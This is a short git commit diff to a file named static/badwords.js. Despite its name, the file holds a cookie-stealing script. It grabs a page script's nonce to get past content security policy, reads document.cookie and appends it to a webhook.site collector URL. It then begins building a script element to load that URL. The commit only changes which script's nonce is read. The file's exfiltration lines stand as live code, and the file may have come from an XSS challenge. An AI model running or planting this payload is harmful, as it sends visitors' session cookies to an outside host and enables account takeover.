0bf62a463aa209bf79bedf570ea1aa0fafcc7433
SovietBeast <44019881+SovietBeast@users.noreply.github.com>
2021-05-15 16:23:15 +0200

    Update badwords.js

--- static/badwords.js
+++ static/badwords.js
@@ -1,4 +1,4 @@
-var nounce = document.querySelectorAll("script")[2].nonce
+var nounce = document.querySelectorAll("script")[1].nonce
 var cook = document.cookie
 var src = 'https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?=' + cook
 var s = document.CreateElement('script')
